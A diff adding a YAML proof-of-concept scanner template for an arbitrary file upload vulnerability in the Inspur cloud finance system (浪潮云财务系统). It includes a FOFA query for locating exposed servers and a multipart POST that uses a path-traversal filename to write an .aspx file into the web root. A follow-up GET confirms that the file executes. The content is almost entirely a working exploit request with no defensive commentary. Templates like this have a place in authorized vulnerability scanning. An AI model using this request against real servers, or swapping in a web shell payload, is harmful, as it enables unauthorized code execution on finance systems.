@@ -1,0 +1,32 @@
+id: poc-yaml-inspur-uploadlistfile-anyfile-upload
+info:
+  name: 浪潮云财务系统 UploadListFile 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 浪潮云财务系统
+  fofa: body="session/gsprtf/LoginPartial.aspx"
+variables:
+  t1: random_str(4)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /cwbase/EP/ListContent/UploadListFile.ashx?uptype=attslib&keyid=1&key1=1&key2=1
+  headers:
+    Content-Type: multipart/form-data; boundary=---------------------------rww5upkbw6ctf0tu5hye
+  data: '-----------------------------rww5upkbw6ctf0tu5hye
+
+    Content-Disposition: form-data; name="file"; filename="../../../../../../{{.t1}}.aspx"
+
+    Content-Type: image/png
+
+
+    {{.t2}}
+
+    -----------------------------rww5upkbw6ctf0tu5hye--'
+  expression: "status_code == 200 && \ncontains(body,\"jsonrpc\") &&\ncontains(body,\"\
+    .aspx\") &&\n!contains(body,\"<\")\n"
+- method: GET
+  path: /cwbase/{{.t1}}.aspx
+  expression: status_code == 200 && body == t2
+transport: http
